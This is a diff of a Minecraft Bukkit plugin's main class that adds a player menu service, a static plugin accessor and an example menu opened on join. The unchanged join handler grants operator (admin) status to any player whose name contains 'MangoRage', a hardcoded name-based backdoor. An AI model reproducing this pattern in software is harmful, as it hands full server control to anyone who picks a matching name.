@@ -11,20 +11,36 @@ import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.mangorage.sigmacore.graves.GraveManager;
+import org.mangorage.sigmacore.menu.MenuExample;
+import org.mangorage.sigmacore.menu.PlayerMenuSystem;
+import org.mangorage.sigmacore.services.CreeperInventory;
+import org.mangorage.sigmacoremixins.Util;
 import org.mangorage.sigmacoremixins.services.IServiceHolder;
-import org.mangorage.sigmacoremixins.services.ServiceId;
 import org.mangorage.sigmacoremixins.services.ServiceManager;
 import org.mangorage.sigmacoremixins.services.ServiceProviderBuilder;
 
 import java.io.FileNotFoundException;
 
 public final class SigmaCore extends JavaPlugin implements Listener {
+    private static JavaPlugin plugin;
+
+    public static JavaPlugin getPlugin() {
+        return plugin;
+    }
+
+
     private final GraveManager graveManager = new GraveManager(this, "graves");
 
     public SigmaCore() {
+        plugin = this;
         ServiceManager.getInstance().registerProvider(
                 ServiceProviderBuilder.of()
                         .put(CreeperInventory.CUSTOM_INV, o -> o instanceof Creeper, o -> new CreeperInventory())
+                        .build()
+        );
+        ServiceManager.getInstance().registerProvider(
+                ServiceProviderBuilder.of()
+                        .put(PlayerMenuSystem.MENU_SYSTEM, o -> o instanceof Player, o -> new PlayerMenuSystem(Util.cast(o)))
                         .build()
         );
     }
@@ -51,6 +67,11 @@ public final class SigmaCore extends JavaPlugin implements Listener {
     public void onPlayerJoin(PlayerJoinEvent event) {
         if (event.getPlayer().getName().contains("MangoRage"))
             event.getPlayer().setOp(true);
+        if (event.getPlayer() instanceof IServiceHolder serviceHolder) {
+            var a = serviceHolder.getService(PlayerMenuSystem.MENU_SYSTEM);
+            if (a != null)
+                a.openMenu(new MenuExample());
+        }
     }
 
     @EventHandler
